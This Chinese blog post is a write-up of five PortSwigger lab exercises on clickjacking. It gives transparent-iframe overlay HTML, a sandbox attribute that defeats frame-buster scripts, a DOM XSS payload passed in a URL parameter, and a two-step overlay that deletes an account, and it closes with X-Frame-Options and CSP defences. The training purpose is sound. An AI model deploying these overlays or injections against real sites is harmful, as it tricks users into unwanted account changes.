# 原创
：  【burpsuite安全练兵场-客户端14】点击劫持-5个实验（全）

# 【burpsuite安全练兵场-客户端14】点击劫持-5个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书，华为云、阿里云、51CTO优质博主等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）构造基本的点击劫持攻击（√）
（2）使用预填充表单输入的点击劫持（√）
（3）帧分解脚本（√）
（4）将点击劫持与DOM结合使用 XSS攻击（√）
（5）多步点击劫持（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、点击劫持](#%E4%B8%80%E3%80%81%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[二、构造基本的点击劫持攻击](#%E4%BA%8C%E3%80%81%E6%9E%84%E9%80%A0%E5%9F%BA%E6%9C%AC%E7%9A%84%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB)

[ 1、简述：](#%C2%A01%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C1%3A%E5%B8%A6%E6%9C%89CSRF%E4%BB%A4%E7%89%8C%E4%BF%9D%E6%8A%A4%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)[实验1:带有CSRF令牌保护的基本点击劫持](#%E5%AE%9E%E9%AA%8C1%3A%E5%B8%A6%E6%9C%89CSRF%E4%BB%A4%E7%89%8C%E4%BF%9D%E6%8A%A4%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[三、使用预填充表单输入的点击劫持](#%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8%E9%A2%84%E5%A1%AB%E5%85%85%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%9A%84%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E4%BB%8EURL%E5%8F%82%E6%95%B0%E9%A2%84%E5%A1%AB%E5%85%85%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E7%9A%84%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)[实验2：从URL参数预填充表单输入数据的点击劫持](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E4%BB%8EURL%E5%8F%82%E6%95%B0%E9%A2%84%E5%A1%AB%E5%85%85%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E7%9A%84%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[三、帧分解脚本](#%E4%B8%89%E3%80%81%E5%B8%A7%E5%88%86%E8%A7%A3%E8%84%9A%E6%9C%AC)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%B8%A7%E7%A0%B4%E5%9D%8F%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)[实验3：使用帧破坏脚本进行点击劫持](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%B8%A7%E7%A0%B4%E5%9D%8F%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[四、将点击劫持与DOM结合使用 XSS攻击](#%E5%9B%9B%E3%80%81%E5%B0%86%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E4%B8%8EDOM%E7%BB%93%E5%90%88%E4%BD%BF%E7%94%A8%20XSS%E6%94%BB%E5%87%BB)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%88%A9%E7%94%A8%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS)[实验4：利用点击劫持漏洞触发基于DOM的XSS](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%88%A9%E7%94%A8%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS)

[五、多步点击劫持](#%E4%BA%94%E3%80%81%E5%A4%9A%E6%AD%A5%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%A4%9A%E6%AD%A5%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)[实验5：多步点击劫持](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%A4%9A%E6%AD%A5%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81)

[六、防止点击劫持攻击](#%E5%85%AD%E3%80%81%E9%98%B2%E6%AD%A2%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、X形框架-选项](#2%E3%80%81X%E5%BD%A2%E6%A1%86%E6%9E%B6-%E9%80%89%E9%A1%B9)

[3、内容安全策略（CSP）](#3%E3%80%81%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89)

---


## 一、点击劫持

> 
<h3>1、简述：</h3>
1、原理：点击劫持是一种基于界面的攻击，用户通过点击诱饵网站中的一些其他内容，被诱骗点击隐藏网站上的可操作内容。
<hr/>
2、示例：
一个网络用户访问一个诱骗网站（也许这是一个由电子邮件提供的链接）并点击一个按钮来赢得奖品。在不知不觉中，他们被攻击者欺骗，按下了另一个隐藏按钮，这导致了另一个网站上的帐户付款。这是一个点击劫持攻击的例子。该技术依赖于合并一个不可见的、可操作的网页（或多个网页），其中包含一个按钮或隐藏链接，比如说，在iframe中。iframe覆盖在用户预期的诱饵网页内容之上。
（此攻击与 CSRF攻击的不同之处在于，用户需要执行按钮单击等操作，而CSRF攻击依赖于在用户不知情或不输入的情况下伪造整个请求）
<hr/>
3、阻碍：防止CSRF攻击通常是通过使用CSRF令牌来提供的：特定于会话的、单次使用的数字或随机数。CSRF令牌无法减轻点击劫持攻击，因为目标会话是使用从可信网站加载的内容建立的，并且所有请求都发生在域中。CSRF令牌被放入请求中，并作为正常行为会话的一部分传递给服务器。与普通用户会话相比，不同之处在于该进程发生在隐藏的iframe中。


---


---


---


## 二、构造基本的点击劫持攻击

> 
<h3> 1、简述：</h3>
点击劫持攻击使用CSS来创建和操作层。攻击者将目标网站合并为覆盖在诱饵网站上的iframe层。
<pre><code>使用style标记和参数的示例如下：
&lt;head&gt;
    &lt;style&gt;
        #target_website {
            position:relative;
            width:128px;
            height:128px;
            opacity:0.00001;
            z-index:2;
            }
        #decoy_website {
            position:absolute;
            width:300px;
            height:400px;
            z-index:1;
            }
    &lt;/style&gt;
&lt;/head&gt;
...
&lt;body&gt;
    &lt;div id="decoy_website"&gt;
    ...decoy web content here...
    &lt;/div&gt;
    &lt;iframe id="target_website" src="https://vulnerable-website.com"&gt;
    &lt;/iframe&gt;
&lt;/body&gt;</code></pre>
<hr/>
2、解释：目标网站iframe被定位在浏览器内，使得使用适当的宽度和高度位置值存在目标动作与诱饵网站的精确重叠。绝对和相对位置值用于确保目标网站准确地与诱饵重叠，而与屏幕大小、浏览器类型和平台无关。z-index决定iframe和website层的堆叠顺序。opacity值定义为0.0（或接近0.0），以便iframe内容对用户透明。浏览器点击劫持防护可能会应用基于阈值的iframe透明度检测（Chrome版本可能会检测，提倡Firefox）。攻击者选择不透明度值，以便在不触发保护行为的情况下实现所需效果
<hr/>3、Clickbandit工具 
 尽管可以如上所述手动创建点击劫持概念证明，但这在实践中可能相当乏味和耗时。当测试点击劫持时，使用Burp的Clickbandit工具。这允许使用浏览器在可成帧页面上执行所需的操作，然后创建一个包含合适的点击劫持覆盖层的HTML文件。、可以使用它在几秒钟内生成交互式概念验证，而不必编写一行HTML或CSS
<hr/>
4、涉及实验：
实验1:带有CSRF令牌保护的基本点击劫持


---


> 
<h3>实验1:带有CSRF令牌保护的基本点击劫持</h3>
信息：
1、本实验包含登录功能和受CSRF令牌保护的删除帐户按钮。用户将单击诱饵网站上显示单词“click”的元素。
2、解决实验：制作一些HTML来构建帐户页面，并欺骗用户删除他们的帐户
3、已有账号：wiener:peter
<hr/>
part1:
登录账号
转到利用漏洞攻击服务器，对模板进行以下调整：
1、将iframe src属性中的YOUR-LAB-ID替换为自己实验室ID<br/> 2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。<br/> 3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，以便“删除帐户”按钮和“测试我”诱饵动作对齐（我们建议分别为300 px和60 px）。<br/> 4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用。
<pre><code>&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;

我的是：
&lt;style&gt;
iframe {
    position:relative;
    width:500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
div {
    position:absolute;
    top:500px;
    left:60px;
    z-index: 1;
}
&lt;/style&gt;
&lt;div&gt;Click me&lt;/div&gt;
&lt;iframe src="https://0a11000404d22a86c463666000e90017.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;</code></pre>



单击存储，然后单击查看漏洞（view）<br/> 将鼠标悬停在click me上，确保光标变为手形，指示div元素已正确定位。(如果div未正确对齐，请调整样式表的top和left属性)
<hr/>
part2:<br/> 正确排列div元素，然后单击Store<br/> 单击“Deliver exploit to victim”（将利用漏洞攻击传送给受害者）

 完成实验<img alt="" height="670" src="https://img-blog.csdnimg.cn/73af545ac10744df8e8eb649ca66fc79.png" width="1200"/>



---


---


---


## 三、使用预填充表单输入的点击劫持

> 
<h3>1、简述：</h3>
1、一些需要表单完成和提交的网站允许在提交之前使用GET参数预先填充表单输入。其他网站可能要求在提交表单之前输入文本。由于GET值是URL的一部分，因此可以修改目标URL以包含攻击者选择的值，并将透明的“提交”按钮覆盖在诱饵站点上，如基本的点击劫持示例所示
<hr/>
2、涉及实验:
实验2：从URL参数预填充表单输入数据的点击劫持


> 
<h3>实验2：从URL参数预填充表单输入数据的点击劫持</h3>
信息：
1、本实验扩展了实验中的基本点击劫持示例：基本的点击劫持与CSRF令牌保护。实验的目标是通过使用URL参数预填充表单并诱使用户无意中单击“Update email”按钮来更改用户的电子邮件地址。
2、解决实验：制作一些HTML来构建帐户页面，并欺骗用户通过单击“单击我”诱饵来更新他们的电子邮件地址
3、已有账号：wiener:peter
<hr/>
part1:
登录账号
转到利用漏洞攻击服务器，对模板进行以下调整：
1、将YOUR-LAB-ID替换为自己实验室ID，以便URL指向目标网站的用户帐户页面，其中包含"更新电子邮件"表单<br/> 2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。<br/> 3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，使"更新电子邮件"按钮和"测试我"诱饵动作对齐（我们建议分别为450px和80px）<br/> 4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用。
<pre><code>&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;


我的是：

&lt;style&gt;
iframe {
    position:relative;
    width:500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}
div {
    position:absolute;
    top:450px;
    left:80px;
    z-index: 1;
}
&lt;/style&gt;
&lt;div&gt;Click me&lt;/div&gt;
&lt;iframe src="https://0a790033031f7481c04d45b0001b0062.web-security-academy.net/my-account?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;</code></pre>

<hr/>
part2:
单击存储，然后单击查看漏洞（view）<br/> 将鼠标悬停在"Test me"上，确保光标变为手形，指示div元素的位置正确。如果没有，请通过修改样式表的top和left属性来调整div元素的位置
（这里是一个“Update email”按钮）


正确排列div元素后，将"Test me"更改为"Click me"，然后单击Store。<br/> 现在，单击Deliver exploit to victim（将漏洞利用发送给受害者）
<img alt="" height="960" src="https://img-blog.csdnimg.cn/9958e94e29db4bf8a8ddd1c8559c387d.png" width="1200"/><br/> 完成实验




---


---


---


## 三、帧分解脚本

> 
<h3>1、简述：</h3>
1、只要网站可以被框定，点击劫持攻击就有可能发生。因此预防技术基于限制网站的成帧能力。通过Web浏览器制定的常见客户端保护是使用帧破坏或帧中断脚本。这些可以通过专有浏览器JavaScript插件或扩展（如NoScript）实现。
<pre><code>脚本通常经过精心编制，以便执行以下部分或全部行为：
1、检查并强制当前应用程序窗口是主窗口或顶部窗口，
2、使所有帧可见，
3、防止点击不可见帧，
4、拦截并标记对用户的潜在点击劫持攻击。</code></pre>
<hr/>
2、帧破坏技术通常是特定于浏览器和平台的，并且由于HTML的灵活性，它们通常可以被攻击者绕过。由于framebuster是JavaScript，因此浏览器的安全设置可能会阻止其运行，甚至浏览器可能不支持JavaScript。攻击者对付frame buster的一个有效的变通方法是使用HTML5 iframe sandbox属性。当使用 allow-forms 或 allow-scripts 值设置此值并省略allow-top-navigation值时，framebuster脚本可以被中和，因为iframe无法检查它是否是顶部窗口：
<pre>`&lt;iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"&gt;&lt;/iframe&gt;`</pre>
两者allow-forms以及allow-scripts值允许iframe内的指定操作，但禁用顶级导航。这将禁止帧破坏行为，同时允许目标站点内的功能。 
<hr/>
3、涉及实验：
实验3：使用帧破坏脚本进行点击劫持


---


> 
<h3>实验3：使用帧破坏脚本进行点击劫持</h3>
信息：
1、本实验室受框架破坏器保护，可防止网站被框架破坏。
2、解决实验：制作一些HTML来构建帐户页面，并欺骗用户通过点击“点击我”来更改他们的电子邮件地址
3、已有账号：wiener:peter
<hr/>
part1:
登录账号
转到利用漏洞攻击服务器，对模板进行以下调整：
1、将YOUR-LAB-ID替换为自己实验室ID，以便URL指向目标网站的用户帐户页面，其中包含"更新电子邮件"表单<br/> 2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。<br/> 3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，使"更新电子邮件"按钮和"测试我"诱饵动作对齐（分别为450px和80px）<br/> 4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用。
5、注意sandbox ="allow-forms"属性的使用，该属性中和了framebuster脚本
<pre><code>&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;

我的是：
&lt;style&gt;
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Click me&lt;/div&gt;
&lt;iframe sandbox="allow-forms"
src="https://0a0f00a603703c46c2fb259800fa00bc.web-security-academy.net/my-account?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;
</code></pre>
<hr/>
part2:
单击存储，然后单击查看漏洞（view）<br/> 将鼠标悬停在"Test me"上，确保光标变为手形，指示div元素的位置正确。如果没有，请通过修改样式表的top和left属性来调整div元素的位置
（这里是一个“Update email”按钮）




正确排列div元素后，将"Test me"更改为"Click me"，然后单击Store<br/> 现在，单击Deliver exploit to victim（将漏洞利用发送给受害者）
<img alt="" height="949" src="https://img-blog.csdnimg.cn/c68dfffb760c405b88d928307c7a4aee.png" width="1200"/><br/> 完成实验




---


---


---


## 四、将点击劫持与DOM结合使用 XSS攻击

> 
<h3>1、简述：</h3>
1、点击劫持被视为一种独立的攻击。从历史上看，点击劫持被用来执行诸如在Facebook页面上增加"喜欢"之类的行为。但当点击劫持被用作另一种攻击的载体时，点击劫持的真正威力就显现出来了，如 DOM XSS攻击。假设攻击者首先识别了XSS漏洞，那么这种组合攻击的实现相对简单。然后，XSS攻击与iframe目标URL结合，以便用户单击按钮或链接，从而执行DOM XSS攻击。 
<hr/>
2、涉及实验：
实验4：利用点击劫持漏洞触发基于DOM的XSS


> 
<h3>实验4：利用点击劫持漏洞触发基于DOM的XSS</h3>
信息：
本实验包含一个单击即可触发的XSS漏洞。构造一个clickjacking攻击，欺骗用户单击“Click me”按钮以调用print函数
<hr/>
part1:
登录账号
转到利用漏洞攻击服务器，对模板进行以下调整：
1、将YOUR-LAB-ID替换为自己实验室ID，以便URL指向目标网站的"Submit feedback"页面<br/> 2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。<br/> 3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，使"Submit feedback"按钮和"click me"诱饵动作对齐（分别为610px和80px）<br/> 4、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用
<pre><code>&lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult"&gt;&lt;/iframe&gt;

我的是：
&lt;style&gt;
	iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:80px;
        z-index: 1;
	}
&lt;/style&gt;
&lt;div&gt;click me&lt;/div&gt;
&lt;iframe
src="https://0a5600e703363c7ac24734f9000d00a0.web-security-academy.net/feedback?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult"&gt;&lt;/iframe&gt;

</code></pre>
<hr/>
part2:
单击存储，然后单击查看漏洞（view）<br/> 将鼠标悬停在"Test me"上，确保光标变为手形，指示div元素的位置正确。如果没有，请通过修改样式表的top和left属性来调整div元素的位置




正确排列div元素后，将"Test me"更改为"Click me"，然后单击Store<br/> 现在，单击Deliver exploit to victim（将漏洞利用发送给受害者）
<img alt="" height="964" src="https://img-blog.csdnimg.cn/146803dc78bb49c1b7fcd474412347d7.png" width="1200"/><br/> 完成实验
 <img alt="" height="823" src="https://img-blog.csdnimg.cn/4e1af0ae0ce5483ba102f96a3e445af4.png" width="1200"/>



---


---


---


## 五、多步点击劫持

> 
<h3>1、简述：</h3>
1、攻击者操纵目标网站的输入可能需要多个操作。如攻击者可能希望诱使用户从零售网站购买商品，因此需要在下单之前将商品添加到购物篮中。攻击者可以使用多个division或iframe来实现这些操作。从攻击者的角度来看，此类攻击需要相当的精确性和谨慎性，才能有效和隐蔽
<hr/>
2、涉及实验：
实验5：多步点击劫持


> 
<h3>实验5：多步点击劫持</h3>
信息：
1、本实验包含一些受CSRF令牌保护的帐户功能，还包含一个确认对话框，用于防止点击劫持
2、解决实验：设计一个攻击，通过单击“先单击我”和“下一步单击我”诱饵操作，诱骗用户单击删除帐户按钮和确认对话框（需要使用两个元素）
3、已有账号：wiener:peter
<hr/>
part1:
登录账号
转到利用漏洞攻击服务器，对模板进行以下调整：
1、将YOUR-LAB-ID替换为自己实验室ID，以便URL指向目标网站的用户帐户页面<br/> 2、用合适的像素值替换iframe的$height_value和$width_value变量（建议分别为700 px和500 px）。<br/> 3、用合适的像素值替换诱饵网页内容的$top_value和$side_value变量，以便"删除帐户"按钮和"先测试我"诱饵操作对齐（分别为330px和50px）
4、为$top_value2和$side_value2变量替换一个合适的值，以便"Testmenext"诱饵操作与确认页面上的"Yes"按钮对齐（我们建议分别为285px和225px）<br/> 5、设置不透明度值$opacity以确保目标iframe是透明的。最初，使用0.1的不透明度，以便可以对齐iframe操作并根据需要调整位置值。对于提交的攻击，值0.0001将起作用
<pre><code>&lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
&lt;/style&gt;
&lt;div class="firstClick"&gt;Test me first&lt;/div&gt;
&lt;div class="secondClick"&gt;Test me next&lt;/div&gt;
&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;

我的是：
&lt;style&gt;
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:215px;
	}
&lt;/style&gt;
&lt;div class="firstClick"&gt;click me first&lt;/div&gt;
&lt;div class="secondClick"&gt;click me next&lt;/div&gt;
&lt;iframe src="https://0a3d009e04f7083bc0ac0e680046002a.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;</code></pre>
<hr/>
part2:
单击存储，然后单击查看漏洞（view）<br/> 将鼠标悬停在"Test me"上，确保光标变为手形，指示div元素的位置正确。如果没有，请通过修改样式表的top和left属性来调整div元素的位置



 正确排列div元素后，将"click me"更改为"Click me"，然后单击Store<br/> 现在，单击Deliver exploit to victim（将漏洞利用发送给受害者）
<img alt="" height="955" src="https://img-blog.csdnimg.cn/7fa8075ce6594d6580aaa5d83282deab.png" width="1200"/><br/> 完成实验




---


---


---


## 六、防止点击劫持攻击

> 
<h3>1、简述：</h3>
1、点击劫持是一种浏览器端行为，其成功与否取决于浏览器的功能以及是否符合流行的网络标准和最佳实践。通过定义和传达对组件（如iframe）使用的约束，可以提供针对点击劫持的服务器端保护。但保护的实现取决于浏览器的遵从性和这些约束的实施。服务器端点击劫持保护的两种机制是X-Frame-Options和Content Security Policy。


> 
<h3>2、X形框架-选项</h3>
X-Frame-Options最初是作为Internet Explorer 8中的一个非官方响应头引入的，它很快被其他浏览器采用。标头为网站所有者提供了对iframe或对象使用的控制，以便可以使用deny指令：
<pre>`X-Frame-Options: deny`</pre>
或者，可以使用sameorigin指令将框架限制为与网站相同的源 directive
<pre>`X-Frame-Options: sameorigin`</pre>
或使用allow-from指令：
<pre>`X-Frame-Options: allow-from https://normal-website.com`</pre>
X-Frame-Options在不同浏览器之间的实现不一致（允许指令在Chrome版本76或Safari 12中不受支持）。然而当与内容安全策略一起作为多层防御策略的一部分正确应用时，它可以提供针对点击劫持攻击的有效保护


> 
<h3>3、内容安全策略（CSP）</h3>
1、内容安全策略（CSP）是一种检测和预防机制，可以减轻XSS和点击劫持等攻击。CSP通常在Web服务器中实现为以下格式的返回头：
<pre>`Content-Security-Policy: policy`</pre>
2、其中policy是以分号分隔的策略指令字符串。CSP向客户端浏览器提供关于浏览器可应用于恶意行为的检测和拦截的web资源的许可源的信息
<hr/>
3、点击劫持保护包括frame-ancestors应用程序的内容安全策略中的指令。该frame-ancestors 'none'指令的行为与X-Frame-Options类似deny指令。该frame-ancestors 'self'指令大致等同于X-Frame-Options 同源指令。以下CSP白名单仅将帧添加到同一域：
<pre>`Content-Security-Policy: frame-ancestors 'self';`</pre>
或框架可以被限制到命名的站点：
<pre>`Content-Security-Policy: frame-ancestors normal-website.com;`</pre>
为了有效地对抗点击劫持和XSS，CSP需要仔细的开发、实现和测试，并且应该作为多层防御策略的一部分使用

